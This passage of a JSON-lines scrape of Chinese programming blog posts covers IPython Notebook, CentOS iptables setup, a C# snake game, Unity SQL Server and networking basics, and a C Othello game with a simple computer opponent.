则相反 \nCtrl+m t 则是把这个cell平凡化了，就是它不具备执行代码的功能了只是文字 \nCtrl+m c 则和它相反，正常化cell \n\n显示图形需要输入%matplotlib inline \n \n文件保存：可以直接在界面保存拓展名为.ipynb \n文件保存路径是默认ipython的环境变量路径", "time": "2018_08_14_11_13_05", "link": "https://blog.csdn.net/qq_37423198/article/details/76180905", "title": "IPython与IPython Notebook安装及使用"}
{"timestamp": "2018_08_14_11_13_05", "desc": "安装即可\n\napt-get install lib32stdc++6", "time": "2018_08_14_11_13_05", "link": "https://blog.csdn.net/chunlongyuan/article/details/47343421", "title": "eclipse报错lib32stdc++6"}
{"timestamp": "2018_08_14_11_13_05", "desc": "操作系统环境：CentOS Linux release 7.0.1406(Core) 64位 \nCentOS 7.0默认使用的是firewall作为防火墙，这里改为iptables防火墙步骤。\n\n1、关闭firewall：\n\nsystemctl stop firewalld.service #停止firewall\nsystemctl disable firewalld.service #禁止firewall开机启动\nfirewall-cmd --state #查看默认防火墙状态（关闭后显示notrunning，开启后显示running）\n\n2、iptables防火墙（这里iptables已经安装，下面进行配置） \nvi/etc/sysconfig/iptables #编辑防火墙配置文件\n\n\n\n# sampleconfiguration for iptables service\n# you can edit thismanually or use system-config-firewall\n# please do not askus to add additional ports/services to this default configuration\n*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT[0:0]\n:OUTPUT ACCEPT[0:0]\n-A INPUT -m state--state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -jACCEPT\n-A INPUT -i lo -jACCEPT\n-A INPUT -p tcp -mstate --state NEW -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -jACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080-j ACCEPT\n-A INPUT -j REJECT--reject-with icmp-host-prohibited\n-A FORWARD -jREJECT --reject-with icmp-host-prohibited\nCOMMIT\n\n:wq! #保存退出\n\n备注：这里使用80和8080端口为例。*部分一般添加到“-A INPUT -p tcp -m state –state NEW -m tcp–dport 22 -j ACCEPT”行的上面或者下面，切记不要添加到最后一行，否则防火墙重启后不生效。 \nsystemctlrestart iptables.service #最后重启防火墙使配置生效 \nsystemctlenable iptables.service #设置防火墙开机启动\n\n=========================================== \nCentOS 7.0默认使用的是firewall作为防火墙，使用iptables必须重新设置一下 \n1、直接关闭防火墙 \nsystemctl stop firewalld.service #停止firewall \nsystemctl disable firewalld.service #禁止firewall开机启动 \n2、设置 iptables service \nyum -y install iptables-services \n如果要修改防火墙配置，如增加防火墙端口3306 \nvi /etc/sysconfig/iptables  \n增加规则 \n-A INPUT -m state –state NEW -m tcp -p tcp –dport 3306 -j ACCEPT \n保存退出后 \nsystemctl restart iptables.service #重启防火墙使配置生效 \nsystemctl enable iptables.service #设置防火墙开机启动 \n最后重启系统使设置生效即可。", "time": "2018_08_14_11_13_05", "link": "https://blog.csdn.net/tototuzuoquan/article/details/78569222", "title": "CentOS 7.0关闭默认防火墙启用iptables防火墙"}
{"timestamp": "2018_08_14_11_13_06", "desc": "新建 \n \n在工具箱中找到  Timer，拖拽使用，将Name改为dt，Interval（单位：毫秒）改为500 \n \n然后编写代码\n\n\n\n string key_name = \"start\";   //记录键盘状态\n        Label[] l_b = new Label[30];   //贪吃蛇身体数组\n        Random r = new Random();    //随机数\n        int a = 0, b = 0;           //变量，记录坐标\n        public Form1()\n        {\n            InitializeComponent();\n        }\n        private void Form1_Load(object sender, EventArgs e)\n        {\n            //设定初始界面状态\n            this.Top = 120;\n            this.Left = 120;\n            this.Width = 800;\n            this.Height = 600;\n            this.BackColor = Color.Black;\n            //造 蛇 身体，长度为5\n            for (int i = 0; i < 5; i++)\n            {\n                Label lb = new Label();\n                lb.Width = lb.Height = 20;\n                lb.Top = 400;\n                lb.Left = 400 - i * 20;\n                lb.BackColor = Color.Red;\n                lb.Text = \"O\";\n                lb.Font = new System.Drawing.Font(\"宋体\", 18);\n                lb.Tag = i;\n                l_b[i] = lb;\n                this.Controls.Add(lb);\n            }\n            //控件Timer\n            dt.Tick += new EventHandler(dt_Tick);\n            //键盘敲击事件\n            this.KeyDown += new KeyEventHandler(Form1_KeyDown);\n\n            snake_food();    //造 蛇 的食物函数\n            dt.Start();    //Timer 开始\n        }\n        void dt_Tick(object sender, EventArgs e)\n        {\n            int x_1, y_1;\n            x_1 = l_b[0].Left;\n            y_1 = l_b[0].Top;\n            if (key_name == \"start\")     //键盘状态处于初始状态\n            {\n                l_b[0].Left = x_1 + 20;\n                snake_move(x_1, y_1);\n            }\n            if (key_name == \"Right\")   //键盘状态处于  向右 状态\n            {\n                l_b[0].Left = x_1 + 20;\n                snake_move(x_1, y_1);\n            }\n            if (key_name == \"Up\")     //键盘状态处于  向上  状态\n            {\n                l_b[0].Top = y_1 - 20;\n                snake_move(x_1, y_1);\n            }\n            if (key_name == \"Down\")   //键盘状态处于  向下  状态\n            {\n                l_b[0].Top = y_1 + 20;\n                snake_move(x_1, y_1);\n            }\n            if (key_name == \"Left\")    //键盘状态处于   向左 状态\n            {\n                l_b[0].Left = x_1 - 20;\n                snake_move(x_1, y_1);\n            }\n            //          穿墙设置\n            if (x_1 > 800)            \n            {\n                l_b[0].Left = 0; ;\n            }\n            if (x_1 < 0)\n            {\n                l_b[0].Left = 800;\n            }\n            if (y_1 > 600)\n            {\n                l_b[0].Top = 0;\n            }\n            if (y_1 < 0)\n            {\n                l_b[0].Left = 600;\n            }\n            //每动一次，判断是否与食物重合\n            eat_time();\n        }\n        //敲击键盘响应\n        void Form1_KeyDown(object sender, KeyEventArgs e)\n        {\n            //记录蛇头坐标\n            int x_1, y_1;\n            x_1 = l_b[0].Left;\n            y_1 =l_b[0].Top;\n            //获取按了什么键\n            key_name = e.KeyCode.ToString();\n\n            if (e.KeyCode.ToString() == \"Right\")   //向右\n            {\n                l_b[0].Left= x_1 + 20;\n                snake_move(x_1, y_1);\n            }\n            if (e.KeyCode.ToString() == \"Up\")    //向上\n            {\n                l_b[0].Top= y_1 - 20;\n                snake_move(x_1, y_1);\n            }\n            if (e.KeyCode.ToString() == \"Down\")     //向下\n            {\n                l_b[0].Top= y_1 + 20;\n                snake_move(x_1, y_1);\n            }\n            if (e.KeyCode.ToString() == \"Left\")    //向左\n            {\n                l_b[0].Left= x_1 - 20;\n                snake_move(x_1, y_1);\n            }\n            //每按一次，判断是否与食物重合\n            eat_time();\n        }\n        //吃的一瞬间\n        void eat_time()\n        {\n            double x1 = 20, y1 = 20, x2 = 20, y2 = 20;\n            foreach (Label lb in this.Controls)\n            {\n                if (lb.Tag.ToString() == \"food\".ToString())\n                {\n                    x2 = lb.Left;\n                    y2 = lb.Top;\n                }\n                if (lb.Tag.ToString() == \"0\".ToString())\n                {\n                    x1 = lb.Left;  //左\n                    y1 = lb.Top;  //上\n                }\n            }\n            if (x2==x1&&y2==y1)\n            {\n                snake_eat();\n                foreach (Label lb in this.Controls)\n                {\n                    if (lb.Tag.ToString() == \"food\".ToString())\n                    {\n                        lb.Top = r.Next(1, 30) * 20;\n                        lb.Left = r.Next(1, 30) * 20;\n                    }\n                }\n            }\n        }\n        //蛇移动函数\n        /*主要思路：保证 蛇 的每一块，移动的下次方向为这块（第N块）的前一块（N-1）*/\n\n        void snake_move(int x_1, int y_1)\n        {\n            int xx = 0;\n            int yy = 0;\n            for (int i = 1; l_b[i] != null; i++)\n            {\n                if (i >= 3)\n                {\n                    xx = a;\n                    yy = b;\n                }\n                if (i == 1)\n                {\n                    xx =l_b[i].Left;\n                    yy = l_b[i].Top;\n                    l_b[i].Left= x_1;\n                    l_b[i].Top= y_1;\n                }\n                else\n                {\n                    a =l_b[i].Left;\n                    b = l_b[i].Top;\n                    l_b[i].Left= xx;\n                    l_b[i].Top= yy;\n                }\n            }\n        }\n        //制造食物\n        void snake_food()\n        {\n            double xx = l_b[0].Left;\n            double yy = l_b[0].Top;\n            Label lb = new Label();\n            lb.Width = 20;\n            lb.Height = 20;\n            lb.Top= r.Next(1, 30) * 20;\n            lb.Left= r.Next(1, 30) * 20;\n            lb.Tag = \"food\";\n            lb.BackColor = Color.Yellow;\n            this.Controls.Add(lb);\n        }\n\n        //吃过的食物，变为 蛇 的一部分\n        void snake_eat()\n        {\n            int i = 0;\n            for (; l_b[i] != null; i++)\n                ;\n            Label lb = new Label();\n            lb.Width = lb.Height = 20;\n            lb.Top = b;\n            lb.Left = a;\n            lb.BackColor = Color.Red;\n            lb.Text = \"O\";\n            lb.Font = new System.Drawing.Font(\"宋体\", 18);\n            lb.Tag = i;\n            l_b[i] = lb;\n            this.Controls.Add(lb);\n        }", "time": "2018_08_14_11_13_06", "link": "https://blog.csdn.net/u013553804/article/details/47681407", "title": "C#贪吃蛇（窗体版本）"}
{"timestamp": "2018_08_14_11_13_06", "desc": "首先，在你的Unity安装目录下找到这几个文件 \n我的是：D:\\unity\\Editor\\Data\\Mono\\lib\\mono\\unity \n \n然后，将其放入你的工程Assets根目录下 \n如图 \n \n然后新建一个脚本 \n代码如下：\n\nusing UnityEngine;\nusing System.Collections;\nusing System.Data.Sql;\nusing System.Data.SqlClient;\n\npublic class LinkSql : MonoBehaviour {\n\n    private SqlConnection sqlCon;\n    private string sqlAddress = \"server=数据库地址;database=数据库名;uid=帐号;pwd=密码\";\n\n    // Use this for initialization\n    void Start () {\n        sqlCon = new SqlConnection(sqlAddress);\n    }\n\n    // Update is called once per frame\n    void Update () {\n\n\n    }\n    public void isLink()\n    {\n        try\n        {\n            sqlCon.Open();\n            Application.LoadLevel(\"Yes\");\n        }\n        catch (System.Exception)\n        {\n            Application.LoadLevel(\"No\");\n            throw;\n        }\n    }\n}\n\n然后将其拖拽在一个物体上。 \n将链接绑在一个Button上。 \n值得注意的是 \n可能会出现这样的问题 \n \n原因在于 \n \n尝试这这样解决 \n右键工程，选择属性 \n \n跳转到如下界面 \n \n此时，目标框架为.NET Framework3.5，将其更改为.NET Framework4 \n \n中间弹出对话框，点击“是”即可 \n \n测试： \n跳转到登陆成功界面 \n \n发布一下试一试 \nWindows版本，成功 \n \n注意！ \n发布在手机上是不能直接链接SqlServer的，需要和安卓配合使用 \n隐约记得利用PHP也可以\n\n\n\n欢迎关注我的微信个人订阅号 \n \n每天多学一点0.0", "time": "2018_08_14_11_13_06", "link": "https://blog.csdn.net/u013553804/article/details/52725848", "title": "Unity链接数据库（SqlServer）"}
{"timestamp": "2018_08_14_11_13_06", "desc": "总述\n\n本文翻译自Unity 5.2的官方文档。如对翻译有任何建议，欢迎留言。\n\nUnity从5.1开始改进了网络系统功能，提供了一个比之前版本更灵活更强大的网络系统。它提供了一个NetworkTransprot类，作为基本的套接字和有很多有用的多人游戏特性的高级组件之间的中间层。\n\n两类网络功能用户\n\n用Unity制作多玩家游戏的用户，这类用户应该从NetworkManager或者高级API章节开始。\n\n搭建网络架构或制作高级的多玩家游戏的用户，这类用户应该从网络传输层API开始阅读。\n\n\n高级API\n\n\nUnity的网络功能提供了高阶的脚本API（HLAPI）。使用它们能满足大多数的多玩家游戏的需求，并且不需要关系底层的实现细节。HLAPI可以让你：\n\n\n控制游戏的网络状态，通过Network Manager\n操作客户端主持的游戏，主持游戏的客户端同时也是一个玩家\n使用一个通用的序列化器序列化数据\n发送和接收网络消息\n从客户端向服务器发送网络命令\n在服务器上远程调用客户端提供的过程（RPC）\n从服务器向客户端发送网络事件\n\n\n引擎和编辑器整合\n\nUnity的网络功能已经集成进了引擎和编辑器中，这允许你用组件的方式可视化地构建你的多玩家游戏。它提供了以下功能：\n\n\n为联网的物体提供了网络标识组件（NetworkIdentity）\n为网络脚本提供的NetworkBehaviour基类\n提供可对物体位置信息自动进行同步的组件\n自动同步脚本中的变量\n支持将网络物体放置到场景中\nNetwork组件\n\n\n网络服务\n\nUnity可为你的游戏提供整个生命周期内的网络服务，包括：\n\n\n比赛的组织\n创建和广播比赛\n列出所有有效的比赛和加入比赛\n接替服务\n在没有专用服务器的情况下也可以联网游戏\n在参赛者间路由消息\n\n\n实时传输层\n\n实时传输层可提供：\n\n\n优化的UDP的协议\n多通道设计，避免线头阻塞问题\n支持为每个通道配置不同的服务质量（QoS）等级\n弹性的网络拓扑，支持点对点或客户机-服务器架构\n\n\n高级API\n\n高级API（HLAPI）是为构建Untiy多玩家联网游戏而提供的一套系统。构建在底层的实时通讯层之上，提供了多玩家游戏需要的很多通用功能。同时，传输层能支持各种不同的网络拓扑。HLAPI是一个服务器命令式的系统，它允许其中一个成员同时作为客户端和服务器，所以不需要专用的服务器。和Unity的网络服务器一起使用的话，开发者只需要很少的工作就能让多玩家游戏在因特网上运行起来。\n\nHLAPI现在使用了一个新的命名空间UnityEngine.Networking。他专注于易用性和迭代开发，为多玩家游戏提供了如下服务：\n\n\n消息处理\n通用的高效序列化器\n分布的物件管理\n状态同步\n网络相关类：Server，Client，Connection等\n\n\nHLAPI的层次和功能结构图如下：\n\n网络系统基本概念\n\n服务器（Server）和伺服器（Host）\n\n在Unity的网络系统中，每个游戏有一个服务器和多个客户端。在没有专用服务器的情况下，其中一个客户端会同时担任服务器的角色，这台客户端被叫做伺服器（Host）。\n\n伺服器上客户端和服务器运行在同一个进程里面。伺服器使用了一个特殊类型的客户端，叫做本地客户端（LocalClient），而其他的客户端叫做远程客户端（RemoteClient）。本地客户端与服务器的通讯是通过直接的函数调用和消息队列，因为他们在同一个进程中。实际上，他和服务器共享同一个场景。远程客户端使用常规的网络连接与服务器进行通讯。\n\n网络系统的一个设计目标是，本地客户端和远程客户端使用同一份代码，这样开发者大多数时候只需要考虑一种类型的客户端的实现。\n\n实例化（Instantiate）和派生（Spawn）\n\n在Unity中，GameObject.Instantiate函数可以创建新的游戏物体。但是在网络环境下，游戏物体还必须在网络上被派生出来。这需要在服务器上创建后，同时通知所有连接的客户端也创建该物体。一旦物体被派生出来，派生系统会负责这些分布的物体的生命周期管理和状态同步。\n\n更多信息可参考“游戏物体的派生” 一节\n\n玩家（Player），本地玩家（Local Player）和授权（Authority）\n\n在网络系统中，玩家物体是特殊的，每个玩家物体和一个玩游戏的真实玩家相关联，来自这个玩家的所有命令都发送给这个玩家物体。一个玩家不能操作其他玩家的玩家物体，只能操作他自己的。所以这里有一个“我的”玩家物体的概念。但一个玩家加入游戏并和一个连接相关联之后，这个玩家物体会在那个玩家的客户端上成为一个本地玩家物体。有一个属性isLocalPlayer会被设置为True，同时这个物体上的一个回调函数OnStartLocalPlayer会被调用到。下图显示了两个客户端和他们各自的本地玩家对象。\n\n只有玩家自己的物体才会被标记上isLocalPlayer标记。这可以被用来过滤用户输入，控制绑定的相机，或者其他应该只对本地玩家进行的处理。\n\n除了isLocalPlayer，一个玩家物体还可以拥有本地的授权。意思是拥有这个物体的那个客户端负责控制这个物体-拥有授权。这通常被用来控制物体的运动，但是也可以用作其他的用途。NetworkTransform组件会使用他，如果在客户端上被设置，他将从客户端想服务器发送移动数据。NetworkIdentity组件有一个选择框可以设置localPlayerAuthority属性。\n\n对于非玩家物体，比如怪物，他们没有关联的客户端，所以授权是在服务器上。\n\n在NetworkBehaviour组件中，有一个isAuthority属性，他用来控制一个物体是否有授权，所有的非玩家物体在服务器上有授权，有localPlayerAuthority的玩家物体在他们自己的客户端上有授权。\n\n非玩家物体在客户端上的授权\n\n从Unity 5.2开始，可以在客户端上对一个非玩家物体授权。有两种方法可以实现。\n\n\n使用NetworkServer.SpawnWithLocalAuthority派生出物体，并传入进行授权的客户端的网络连接；\n使用NetworkIdentity.AssignClientAuthority函数修改拥有者，传入目标客户端的网络连接。\n\n\n指定授权给客户端会导致这个物体中的NetworkBehaviours类中的OnStartAuthority()函数被调用，同时属性hasAuthority将被设置为true。在其他的客户端上，hasAuthority属性将保持为false。拥有客户端授权的非玩家物体可以发送命令，像玩家对象一样。这些命令将被执行在服务器上，而不是在关联的玩家客户端上。\n\n用客户端授权的非玩家对象，必须将NetworkIdentity中的LocalPlayerAuthority选项选中。\n\n下面的例子派生出一个物体，并且将授权指定给派生他的客户端：\n\n[Command] \nvoidCmdSpawn() \n{ \n    var go =(GameObject)Instantiate(otherPrefab, transform.position + new Vector3(0,1,0),Quaternion.identity); \n    NetworkServer.SpawnWithClientAuthority(go,connectionToClient); \n}\n\n网络上下文\n\n在NetworkBehaviour类中有一些属性，允许脚本在任何时候获得关于物体的网络上下文信息：\n\n\nisServer – true 如果物体是在服务器（或伺服器）上而且已经被派生出来；\nisClient – true 如果物体是在客户端上，而且已经在服务器上被创建；\nisLocalPlayer – ture 如果物体是当前客户端的玩家对象\nisAuthority – true 如果物体的拥有者是本地进程\n\n\n上面就是Unity的新版网络系统中的基本概念。\n\n转载自：\n\n\n  http://www.aichengxu.com/view/2405124\n\n\n\n\n欢迎关注我的微信个人订阅号 \n \n每天多学一点0.0", "time": "2018_08_14_11_13_06", "link": "https://blog.csdn.net/u013553804/article/details/52207721", "title": "Unity多人游戏和网络功能（一） 概述和基本概念"}
{"timestamp": "2018_08_14_11_13_06", "desc": "先大致了解一下黑白棋：\n\n\n  规则 \n  如果玩家在棋盘上没有地方可以下子，则该玩家对手可以连下。双方都没有棋子可以下时棋局结束，以棋子数目来计算胜负，棋子多的一方获胜。 \n  在棋盘还没有下满时，如果一方的棋子已经被对方吃光，则棋局也结束。将对手棋子吃光的一方获胜。 \n  翻转棋类似于棋盘游戏“奥赛罗 (Othello)”，是一种得分会戏剧性变化并且需要长时间思考的策略性游戏。 \n  翻转棋的棋盘上有 64 个可以放置黑白棋子的方格（类似于国际象棋和跳棋）。游戏的目标是使棋盘上自己颜色的棋子数超过对手的棋子数。 \n  该游戏非常复杂，其名称就暗示着结果的好坏可能会迅速变化。 \n  当游戏双方都不能再按规则落子时，游戏就结束了。通常，游戏结束时棋盘上会摆满了棋子。结束时谁的棋子最多谁就是赢家。 \n  玩法 \n  每个“翻转棋”游戏开始时，棋盘上已经交叉放好了四颗棋子。其中两颗是黑棋，另两颗是白棋。黑棋总是先走。 \n  当您的棋子在某一直线方向包围了对手的棋子时，就可以翻转这些棋子的颜色，使它们成为您方的颜色。例如，如果您执黑棋，并且看到在一排白棋的某一端是一颗黑棋，那么当您将一颗黑棋放在这一排的另一端时，所有的白棋都将翻转并变为黑棋！ \n  所有的直线方向均有效：水平、垂直和斜线方向。 \n  走棋的唯一规则是只能走包围并翻转对手的棋子。每一回合都必须至少翻转一颗对手的棋子。 \n  按规则不能再走棋时，这一回合弃权。这一步的行棋权将被交给对方。\n\n\n由以上可知，在做黑白棋人机对战时，AI要遵守游戏规则。根据\n\n\n  感知(Sense)→思考(Think)→行动(Act) \n\n\n这个基本架构去设计AI \n感知玩家下的棋子位置； \n思考我方下子后，增加多少分，玩家接下来走的位置，会减少我方多少分，以相差最高为标准，确定下棋位置； \n行动落子；\n\n根据以上分析，编写程序，代码如下：\n\n\n\n#include <stdio.h>\n//显示棋盘上棋子的状态\nvoid Output(char chessboard[][8]) \n{\n    int row, col;\n    printf(\"\\n   \");\n    //输出列标号 \n    for (col = 0; col < 8; col++)   \n    {\n        printf(\"  %c \", 'A' + col);\n    }\n    printf(\"\\n\");\n    //输出项部横线 \n    printf(\"  ┌\");  \n    //输出一行 \n    for (col = 0; col < 7; col++)   \n    {\n        printf(\"─┬\");\n    }\n    printf(\"─┐\\n\");\n    for (row = 0; row < 8; row++)\n    {\n        //输出行号\n        printf(\"%2d│\", row + 1);    \n        //输出棋盘各单元格中棋子的状态 \n        for (col = 0; col < 8; col++)\n        {\n            if (chessboard[row][col] == 1)//白棋 \n            {\n                printf(\"○│\");\n            }\n            else if (chessboard[row][col] == -1)//黑棋 \n            {\n                printf(\"●│\");\n            }\n            else//未下子处 \n            {\n                printf(\"  │\");\n            }\n        }\n        printf(\"\\n\");\n        if (row < 8 - 1)\n        {\n            printf(\"  ├\");  //输出交叉线 \n            //输出一行 \n            for (col = 0; col < 8 - 1; col++)\n            {\n                printf(\"─┼\");\n            }\n            printf(\"─┤\\n\");\n        }\n    }\n    printf(\"  └\");\n    //最后一行的横线\n    for (col = 0; col < 8 - 1; col++)    \n    {\n        printf(\"─┴\");\n    }\n    printf(\"─┘\\n\");\n}\n//检查某一方是否还有下子的地方\nint Check(char chessboard[][8], int isDown[][8], char player)   \n{\n    int rowdelta, coldelta, row, col, x, y = 0;\n    int iStep = 0;\n    char opponent = (player == 1) ? -1 : 1; //对方棋子 \n    char myplayer = -1 * opponent;  //我方棋子 \n    //将isDown数组全部清0 \n    for (row = 0; row < 8; row++)   \n    {\n        for (col = 0; col < 8; col++)\n        {\n            isDown[row][col] = 0;\n        }\n    }\n    //循环判断棋盘中哪些单元格可以下子 \n    for (row = 0; row < 8; row++)   \n    {\n        for (col = 0; col < 8; col++)\n        {\n            //若棋盘上对应位置不为空(表示已经有子)\n            if (chessboard[row][col] != 0)   \n            {\n                continue;//继续处理下一个单元格 \n            }\n            //循环检查上下行\n            for (rowdelta = -1; rowdelta <= 1; rowdelta++)   \n            {\n                //循环检查左右列\n                for (coldelta = -1; coldelta <= 1; coldelta++)   \n                {\n                    //检查若坐标超过棋盘 或为当前单元格\n                    if (row + rowdelta < 0 || row + rowdelta >= 8\n                        || col + coldelta < 0 || col + coldelta >= 8\n                        || (rowdelta == 0 && coldelta == 0))     \n                    {\n                        continue;   //继续循环 \n                    }\n                    //若(row,col)四周有对手下的子 \n                    if (chessboard[row + rowdelta][col + coldelta] == opponent) \n                    {\n                        //以对手下子位置为坐标\n                        x = row + rowdelta;  \n                        y = col + coldelta;\n                        //对对手下子为起始点，向四周查找自己方的棋子，以攻击对方棋子 \n                        while(1)    \n                        {\n                            //对手下子的四周坐标\n                            x += rowdelta;   \n                            y += coldelta;\n                            //超过棋盘\n                            if (x < 0 || x >= 8 || y < 0 || y >= 8)  \n                            {\n                                break;  //退出循环 \n                            }\n                            //若对应位置为空\n                            if (chessboard[x][y] == 0)   \n                            {\n                                break;\n                            }\n                            //若对应位置下的子是当前棋手的\n                            if (chessboard[x][y] == myplayer)    \n                            {\n                                //设置移动数组中对应位置为1 (该位置可下子，形成向对手进攻的棋形)\n                                isDown[row][col] = 1;   \n                                iStep++;    //累加可下子的位置数量 \n                                break;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    //返回可下的位置数量（若返回值为0，表示没地方可下）\n    return iStep; \n}\n//在指定位置下子 \nvoid PlayStep(char chessboard[][8], int row, int col, char player)  \n{\n    int rowdelta = 0;\n    int coldelta = 0;\n    int x = 0;\n    int y = 0;\n    char opponent = (player == 1) ? -1 : 1; //对方棋子\n    char myplayer = -1 * opponent;  //我方棋子 \n    chessboard[row][col] = myplayer;    //保存所下的棋子\n    //检查所下子四周的棋子\n    for (rowdelta = -1; rowdelta <= 1; rowdelta++)  \n    {\n        for (coldelta = -1; coldelta <= 1; coldelta++)\n        {\n            //若坐标超过棋盘界限\n            if (row + rowdelta < 0 || row + rowdelta >= 8 || col + coldelta < 0\n                || col + coldelta >= 8 || (rowdelta == 0 && coldelta == 0)) \n            {\n                continue;   //继续下一位置 \n            }\n            //若该位置是对手的棋子\n            if (chessboard[row + rowdelta][col + coldelta] == opponent)  \n            {\n                //以对手棋为坐标\n                x = row + rowdelta;  \n                y = col + coldelta;\n                //在对手棋子四周寻找我方棋子 \n                while(1)    \n                {\n                    x += rowdelta;\n                    y += coldelta;\n                    //若坐标超过棋盘\n                    if (x < 0 || x >= 8 || y < 0 || y >= 8)  \n                    {\n                        break;  //退出循环\n                    }\n                    //若对应位置为空 \n                    if (chessboard[x][y] == 0)  \n                    {\n                        break;  //退出循环 \n                    }\n                    //若对应位置是我方模子\n                    if (chessboard[x][y] == myplayer)    \n                    {\n                        //循环处理 \n                        while (chessboard[x -= rowdelta][y -= coldelta] == opponent)    \n                        {\n                            //将中间的棋子都变成我方棋子\n                            chessboard[x][y] = myplayer;     \n                        }\n                        break;  //退出循环 \n                    }\n                }\n            }\n        }\n    }\n}\n//获取分数\nint GetMaxScore(char chessboard[][8], char player)   \n{\n    int Score, row, col;\n    char opponent = (player == 1) ? -1 : 1; //对方棋子 \n    char myplayer=-1*opponent;\n    for (row = 0; row < 8; row++)   //循环 \n    {\n        for (col = 0; col < 8; col++)\n        {\n            //若棋盘对应位置是对手下的棋子，从总分中减1\n            Score -= chessboard[row][col] == opponent;  \n            //若棋盘对应位置是我方的棋子，总分中加1分\n            Score += chessboard[row][col] == myplayer;   \n        }\n    }\n    return Score;//返回分数 \n}\n//获取最佳下子位置\nint BestPlay(char chessboard[][8], int isDown[][8], char player)     \n{\n    int row, col, i, j;\n    //定义一个临时数组\n    char chessboard1[8][8] = { 0 };  \n    int MaxScore = 0;   //保存最高分 \n    int Score = 0;\n    char opponent = (player == 1) ? -1 : 1; //对手下的棋子 \n    //循环检查每个单元格\n    for (row = 0; row < 8; row++)    \n    {\n        for (col = 0; col < 8; col++)\n        {\n            //若该位置不可下子\n            if (!isDown[row][col])  \n            {\n                continue;   //继续 \n            }\n            //复制棋盘各单元格下子的状态到临时数组\n            for (i = 0; i < 8; i++)  \n            {\n                for (j = 0; j < 8; j++)\n                {\n                    chessboard1[i][j] = chessboard[i][j];\n                }\n            }\n            //在临时数组中的指定行列下子\n            PlayStep(chessboard1, row, col, player);\n            //获取下子后可得到的分数\n            Score = GetMaxScore(chessboard1, player);\n            //若原方案得到的分数小于本次下子的分数 \n            if (MaxScore < Score)   \n            {\n                MaxScore = Score;   //保存最高分 \n            }\n        }\n    }\n    return MaxScore;//返回得到的最高分 \n}\n//AI自动下子\nvoid AutoPlayStep(char chessboard[][8], int isDown[][8], char player)    \n{\n    int row, col, row1, col1, i, j;\n    //对方可下子提到的分数和最小分数\n    int Score = 0, MinScore = 100;   \n    //临时数组，保存棋盘下子位置 \n    char chessboard1[8][8]; \n    //临时数组，保存可下子位置 \n    int isDown1[8][8];      \n    char opponent = (player == 1) ? -1 : 1; //对手下的棋子    \n    for (row = 0; row < 8; row++)   //循环检查棋盘每个单元格 \n    {\n        for (col = 0; col < 8; col++)\n        {   \n            //若不可下子\n            if (isDown[row][col] == 0)   \n            {\n                continue;//继续下一个位置 \n            }\n            //将棋盘原来的棋子复制到临时数组中\n            for (i = 0; i < 8; i++)  \n            {\n                for (j = 0; j < 8; j++)\n                {\n                    chessboard1[i][j] = chessboard[i][j];\n                }\n            }\n            //试着在临时棋盘中的一个位子下子\n            PlayStep(chessboard1, row, col, player);     \n            //检查对手是否有地方可下子\n            Check(chessboard1, isDown1, opponent);   \n            //获得临时棋盘中对方下子的得分情况\n            Score = BestPlay(chessboard1, isDown1, opponent);   \n            //保存对方得分最低的下法 \n            if (Score < MinScore)   \n            {\n                MinScore = Score;\n                row1 = row;\n                col1 = col;\n            }\n        }\n    }\n    //AI按最优下法下子 \n    PlayStep(chessboard, row1, col1, player);   \n} \nint main()\n{\n    //保存棋盘中各单元格下子的状态\n    char chessboard[8][8];  \n    //保存棋盘中各位置是否可以下子，可下子的位置为1，其余位置为0 \n    int isDown[8][8] = { 0 };       \n    int row, col, x, y;\n    //已下棋子数量 \n    int iCount = 0; \n    int player = 0; //下棋方\n    //跳过下子的次数，若为2，表示双方都不能下子\n    int SkipPlay = 0;    \n    //保存AI和游戏者的得分\n    int Score[2];    \n    char select;\n    printf(\"黑白棋\\n\\n\");\n    printf(\"游戏者执黑先下，AI执白，按回车键开始:\\n\");\n    scanf(\"%c\", &select);\n    do\n    {\n        //计算下棋方(0表示游戏者,1表示AI)\n        if (player == 0) \n        {\n            player = 1;\n        }\n        else\n        {\n            player = 0;\n        }\n        iCount = 4; //累计下子数 \n        //棋盘各位置清空 \n        for (row = 0; row < 8; row++)   \n        {\n            for (col = 0; col < 8; col++)\n            {\n                chessboard[row][col] = 0;\n            }\n        }\n        //在棋盘中间位置放置白棋 \n        chessboard[3][3] = chessboard[4][4] = 1;    \n        //在棋盘中间位置放置黑棋 \n        chessboard[3][4] = chessboard[4][3] = -1;   \n        printf(\"\\n棋盘初始状态:\\n\");\n        //显示初始棋盘下子的状况 \n        Output(chessboard);\n        do\n        {\n            //若是游戏者下棋(下白子) \n            if (player == 1)    \n            {\n                player = 0;\n                //判断是否可下黑子 \n                if (Check(chessboard, isDown, 2))   \n                {\n                    //死循环，直到用户输入正确的坐标为止\n                    while(1) \n                    {\n                        fflush(stdin);\n                        printf(\"输入下子的位置(行 列):\");\n                        scanf(\"%d%c\", &x, &y);\n                        x--;    //计算行坐标位置 \n                        if(y >= 'a')\n                        {\n                            y = y - 'a' + 1;\n                        }\n                        else\n                        {\n                            y = y - 'A' + 1;\n                        }\n                        y--;    //计算列位置 \n                        //若行列坐标输入有效\n                        if (x >= 0 && y >= 0 && x < 8 && y < 8 && isDown[x][y])  \n                        {\n                            //在指定坐标位置下黑子\n                            PlayStep(chessboard, x, y, 2);  \n                            iCount++;   //累加下子数 \n                            break;\n                        }\n                        else\n                        {\n                            printf(\"坐标输入错误，请重新输入。\\n\");\n                        }\n                    }\n                    printf(\"\\n你下子后的状态:\\n\");\n                    Output(chessboard); //显示棋子状态\n                    printf(\"按任意键AI下子。\\n\");\n                    getch();\n                }\n                //若无效下子的次数小于2\n                else if (++SkipPlay < 2)     \n                {\n                    fflush(stdin);  //清除输入缓冲区 \n                    printf(\"你没位置可下，按回车键让对方下子。\");\n                    scanf(\"%c\", &select);\n                } else\n                {\n                    printf(\"双方都没地方下子，游戏结束!\\n\");\n                }\n            }\n            //若是AI下棋(下黑子) \n            else    \n            {\n                player = 1;\n                //检查是否可下白子\n                if (Check(chessboard, isDown, 1))    \n                {\n                    SkipPlay = 0;   //清除无效下子次数 \n                    //AI下一个白子 \n                    AutoPlayStep(chessboard, isDown, 1);    \n                    iCount++;   //累加下子数\n                    printf(\"\\nAI下子后的状态:\\n\");\n                    Output(chessboard); 